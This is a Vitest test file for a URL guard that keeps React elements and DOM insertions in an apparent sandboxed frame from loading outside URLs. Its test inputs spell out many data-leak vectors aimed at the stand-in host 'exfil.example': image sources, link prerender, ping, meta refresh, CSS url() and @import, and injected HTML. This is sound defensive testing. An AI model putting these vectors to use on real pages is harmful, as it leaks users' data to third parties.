import { jsx, jsxs } from "react/jsx-runtime";
import { createElement } from "react";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";

import { guardedElementFunction, installDomGuard, isSafeUrl, unsafeCssUrl, vetElement, vetReactElement } from "../src/artifact/jsx-runtime/url-guard.ts";

// The page's own (unguarded) methods, taken before the guard is installed: to build an element the way code that got round the guard would.
const rawSetAttribute = Element.prototype.setAttribute;
const raw = (element: Element, name: string, value: string): void => { rawSetAttribute.call(element, name, value); };

const refusals: string[] = [];
beforeAll(() => { installDomGuard(document, { onRefused: (reason) => refusals.push(reason) }); });
afterEach(() => { document.body.replaceChildren(); document.head.querySelectorAll("[data-t]").forEach((node) => node.remove()); refusals.length = 0; });

const BAD = "https://exfil.example/x?d=secret";

describe("which URLs are safe", () => {
  it.each(["", "#top", "#", "data:image/png;base64,AAAA", "DATA:text/plain,x", "blob:https://x/uuid", " \n data:,x", "\u0000data:,x"])("%j is safe", (url) => expect(isSafeUrl(url)).toBe(true));
  it.each([BAD, "http://127.0.0.1:1/x", "//exfil.example/x", "/relative.png", "relative.png", "javascript:alert(1)", "about:blank", "ftp://x", "da\tta:x".replace("\t", "!"), "datax:foo", "blob", "HTTPS://X"])("%j is not", (url) => expect(isSafeUrl(url)).toBe(false));
});

describe("vetElement: the rule set", () => {
  const vet = (tag: string, attributes: Record<string, string> = {}, text = ""): string | undefined => vetElement(tag, Object.entries(attributes), text);
  it("refuses the elements that fetch or frame, whatever their attributes", () => {
    for (const tag of ["base", "iframe", "frame", "frameset", "object", "embed", "portal", "applet", "script", "IFRAME"]) expect(vet(tag), tag).toBeDefined();
  });
  it("refuses a URL that is not data:, blob: or # on every URL-bearing attribute", () => {
    for (const [tag, attribute] of [["link", "href"], ["link", "imagesrcset"], ["img", "src"], ["img", "srcset"], ["source", "src"], ["source", "srcset"], ["video", "src"], ["video", "poster"], ["audio", "src"], ["track", "src"], ["form", "action"], ["button", "formaction"], ["input", "formaction"], ["input", "src"], ["a", "ping"], ["area", "ping"], ["image", "xlink:href"], ["image", "href"], ["use", "href"], ["feimage", "href"], ["div", "background"], ["blockquote", "cite"], ["video", "src"]] as const) {
      expect(vet(tag, { [attribute]: BAD }), `${tag} ${attribute}`).toBeDefined();
    }
    expect(vet("img", { srcset: `data:image/png;base64,AA 1x, ${BAD} 2x` })).toBeDefined();
  });
  it("allows the same elements with safe URLs, and a plain link a person clicks", () => {
    expect(vet("img", { src: "data:image/png;base64,AA" })).toBeUndefined();
    expect(vet("img", { srcset: "data:image/png;base64,AA 1x, blob:x 2x" })).toBeUndefined();
    expect(vet("link", { rel: "stylesheet", href: "data:text/css,a{}" })).toBeUndefined();
    expect(vet("form", { action: "#" })).toBeUndefined();
    expect(vet("use", { href: "#icon" })).toBeUndefined();
    expect(vet("a", { href: "https://docs.example/page" })).toBeUndefined();
    expect(vet("a", { href: "#x", ping: "" })).toBeUndefined();
    expect(vet("div", { className: "x", title: BAD })).toBeUndefined();
  });
  it("meta: no http-equiv and no url=", () => {
    expect(vet("meta", { "http-equiv": "refresh", content: `0;url=${BAD}` })).toBeDefined();
    expect(vet("meta", { "http-equiv": "x-dns-prefetch-control", content: "on" })).toBeDefined();
    expect(vet("meta", { content: `0; URL = ${BAD}` })).toBeDefined();
    expect(vet("meta", { name: "viewport", content: "width=device-width" })).toBeUndefined();
  });
  it("style attributes and <style> text may not name a URL that is not safe", () => {
    for (const css of [`background:url(${BAD})`, `background:url("${BAD}")`, `background:url( '${BAD}' )`, `@import "${BAD}";`, `@import url(${BAD});`, `background:image-set("${BAD}" 1x)`, `background:-webkit-image-set('${BAD}' 1x)`, `src:url(${BAD})`, "background:url(/rel.png)"]) {
      expect(unsafeCssUrl(css), css).toBeDefined();
      expect(vet("div", { style: css }), css).toBeDefined();
      expect(vet("style", {}, css), css).toBeDefined();
    }
    for (const css of ["color:red", "background:url(data:image/svg+xml;base64,AA)", "background:url(#grad)", "/* url(https://x) */ color:red", "background:image-set(url(data:,x) 1x)"]) expect(unsafeCssUrl(css), css).toBeUndefined();
  });
});

describe("React elements", () => {
  it("a refused host element renders as nothing; everything else is React unchanged", () => {
    const seen: string[] = [];
    const guardedJsx = guardedElementFunction(jsx, (reason) => seen.push(reason));
    const guardedCreate = guardedElementFunction(createElement, (reason) => seen.push(reason));
    expect(guardedJsx("link", { rel: "prerender", href: BAD })).toBeNull();
    expect(guardedJsx("img", { src: BAD, alt: "" })).toBeNull();
    expect(guardedCreate("a", { href: "#x", ping: BAD }, "x")).toBeNull();
    expect(guardedJsx("div", { style: { backgroundImage: `url(${BAD})` } })).toBeNull();
    expect(guardedJsx("div", { dangerouslySetInnerHTML: { __html: `<img src="${BAD}">` } })).toBeNull();
    expect(guardedJsx("style", { children: `@import "${BAD}";` })).toBeNull();
    expect(guardedJsx("form", { action: BAD, children: "x" })).toBeNull();
    expect(guardedJsx("meta", { httpEquiv: "refresh", content: `0;url=${BAD}` })).toBeNull();
    expect(guardedJsx("img", { srcSet: `${BAD} 1x` })).toBeNull();
    expect(seen).toHaveLength(9);
    const kept = guardedJsx("img", { src: "data:image/png;base64,AA", alt: "" });
    expect(kept).not.toBeNull();
    expect(kept).toMatchObject({ type: "img" });
    expect(guardedJsx("div", { className: "x", children: "hello" })).toMatchObject({ type: "div" });
    expect(guardedCreate("span", null, "x")).toMatchObject({ type: "span" });
    const Component = (): null => null;
    expect(guardedJsx(Component, { href: BAD })).toMatchObject({ type: Component });
    expect(vetReactElement(jsxs, {})).toBeUndefined();
  });
});

describe("the DOM guard", () => {
  const tick = async (): Promise<void> => { await Promise.resolve(); await new Promise((resolve) => setTimeout(resolve, 0)); };
  const link = (): HTMLLinkElement => { const node = document.createElement("link"); raw(node, "rel", "prerender"); raw(node, "href", BAD); node.dataset["t"] = "1"; return node; };

  it("does not insert a refused element, by any insertion method", () => {
    const host = document.body;
    host.appendChild(link());
    host.append(link());
    host.prepend(link());
    host.insertBefore(link(), null);
    host.append(document.createTextNode("kept"), link());
    host.insertAdjacentElement("beforeend", link());
    const marker = document.createElement("i");
    host.append(marker);
    marker.replaceWith(link());
    host.replaceChildren(link());
    expect(document.querySelectorAll("link")).toHaveLength(0);
    expect(refusals.length).toBeGreaterThanOrEqual(8);
  });

  it("removes a refused element from inside a subtree or a fragment before inserting it", () => {
    const wrapper = document.createElement("div");
    wrapper.innerHTML = "<p>hi</p>";
    const img = document.createElement("img");
    raw(img, "src", BAD);
    wrapper.append(img);
    document.body.append(wrapper);
    expect(document.querySelectorAll("img")).toHaveLength(0);
    expect(document.querySelector("p")?.textContent).toBe("hi");
    const fragment = document.createDocumentFragment();
    const iframe = document.createElement("iframe");
    fragment.append(iframe, document.createElement("b"));
    document.body.append(fragment);
    expect(document.querySelector("iframe")).toBeNull();
    expect(document.querySelector("b")).not.toBeNull();
  });

  it("cleans HTML text: innerHTML, outerHTML, insertAdjacentHTML, document.write, createContextualFragment", () => {
    const box = document.createElement("div");
    document.body.append(box);
    box.innerHTML = `<b>ok</b><img src="${BAD}"><link rel="preconnect" href="${BAD}"><form action="${BAD}"></form>`;
    expect(box.innerHTML).toBe("<b>ok</b>");
    expect(box.querySelectorAll("img, link")).toHaveLength(0);
    box.insertAdjacentHTML("beforeend", `<a href="#x" ping="${BAD}">x</a><u>u</u>`);
    expect(box.querySelector("a")).toBeNull();
    expect(box.querySelector("u")).not.toBeNull();
    const target = document.createElement("section");
    box.append(target);
    target.outerHTML = `<meta http-equiv="refresh" content="0;url=${BAD}"><s>s</s>`;
    expect(document.querySelector("meta[http-equiv]")).toBeNull();
    expect(document.querySelector("s")).not.toBeNull();
    const range = document.createRange();
    const made = range.createContextualFragment(`<video src="${BAD}"></video><em>e</em>`);
    expect(made.querySelector("video")).toBeNull();
    expect(made.querySelector("em")).not.toBeNull();
    document.write(`<object data="${BAD}"></object>`);
    expect(document.querySelector("object")).toBeNull();
    expect(refusals.length).toBeGreaterThanOrEqual(6);
  });

  it("text and safe markup pass through as they were", () => {
    const box = document.createElement("div");
    document.body.append(box);
    box.innerHTML = '<ul><li class="a">one</li></ul><img alt="" src="data:image/png;base64,AA">';
    expect(box.innerHTML).toBe('<ul><li class="a">one</li></ul><img alt="" src="data:image/png;base64,AA">');
    expect(refusals).toEqual([]);
  });

  it("the observer removes an element whose attribute is made unsafe after it was inserted, and a node added by an unpatched path", async () => {
    const image = document.createElement("img");
    image.setAttribute("src", "data:image/png;base64,AA");
    document.body.append(image);
    raw(image, "src", BAD);
    await tick();
    expect(document.querySelector("img")).toBeNull();
    const meta = document.createElement("meta");
    meta.name = "x";
    document.head.append(meta);
    raw(meta, "http-equiv", "refresh");
    await tick();
    expect(document.head.contains(meta)).toBe(false);
    const css = document.createElement("div");
    document.body.append(css);
    css.style.cssText = `background:url(${BAD})`;
    await tick();
    expect(document.body.contains(css)).toBe(false);
    expect(refusals.length).toBeGreaterThanOrEqual(3);
  });

  it("an attribute or property set to an unsafe value is not applied at all (an element in the document would start its request first)", () => {
    const link = document.createElement("link");
    document.head.append(link);
    link.setAttribute("rel", "prerender");
    link.setAttribute("href", BAD);
    expect(link.hasAttribute("href")).toBe(false);
    link.href = BAD;
    link.setAttributeNS(null, "href", BAD);
    expect(link.getAttribute("href")).toBeNull();
    link.setAttribute("href", "data:text/css,a{}");
    expect(link.getAttribute("href")).toBe("data:text/css,a{}");
    const img = document.createElement("img");
    document.body.append(img);
    img.src = BAD;
    img.srcset = `${BAD} 1x`;
    expect(img.getAttribute("src")).toBeNull();
    expect(img.getAttribute("srcset")).toBeNull();
    img.src = "data:image/png;base64,AA";
    expect(img.getAttribute("src")).toBe("data:image/png;base64,AA");
    const anchor = document.createElement("a");
    anchor.href = "#top";
    anchor.setAttribute("ping", BAD);
    expect(anchor.hasAttribute("ping")).toBe(false);
    expect(refusals.length).toBeGreaterThanOrEqual(6);
    link.remove();
  });

  it("a style update on a large subtree vets that element only", async () => {
    const big = document.createElement("div");
    for (let index = 0; index < 500; index += 1) big.append(document.createElement("span"));
    document.body.append(big);
    await tick();
    const scan = vi.spyOn(big, "querySelectorAll");
    big.style.color = "red";
    await tick();
    expect(scan).not.toHaveBeenCalled();
    expect(document.body.contains(big)).toBe(true);
  });

  it("removes WebRTC", () => {
    expect((window as unknown as Record<string, unknown>)["RTCPeerConnection"]).toBeUndefined();
    expect(() => { (window as unknown as Record<string, unknown>)["RTCPeerConnection"] = class {}; }).toThrow();
  });
});

describe("the frame's react module (entries/react.mjs)", () => {
  it("renders nothing for a refused host element and passes everything else through, on every element function", async () => {
    // @ts-expect-error the entry is a plain .mjs bundled for the frame
    const module = (await import("../src/artifact/jsx-runtime/entries/react.mjs")) as { default: Record<string, Record<string, (...args: unknown[]) => unknown>> };
    const react = module.default["react"]!;
    const runtime = module.default["react/jsx-runtime"]!;
    const dev = module.default["react/jsx-dev-runtime"]!;
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    expect(runtime["jsx"]!("link", { rel: "prerender", href: BAD })).toBeNull();
    expect(runtime["jsxs"]!("div", { children: [runtime["jsx"]!("img", { src: BAD })] })).toMatchObject({ type: "div" });
    expect(react["createElement"]!("a", { ping: BAD }, "x")).toBeNull();
    expect(warn).toHaveBeenCalled();
    warn.mockRestore();
    expect(react["createElement"]!("p", { className: "x" }, "hi")).toMatchObject({ type: "p" });
    expect(runtime["jsx"]!("img", { src: "data:image/png;base64,AA", alt: "" })).toMatchObject({ type: "img" });
    expect(typeof react["useState"]).toBe("function");
    expect(typeof runtime["Fragment"]).toBe("symbol");
    // production React has no jsxDEV: the wrapper must not invent one
    expect(dev["jsxDEV"] === undefined || typeof dev["jsxDEV"] === "function").toBe(true);
  });
});
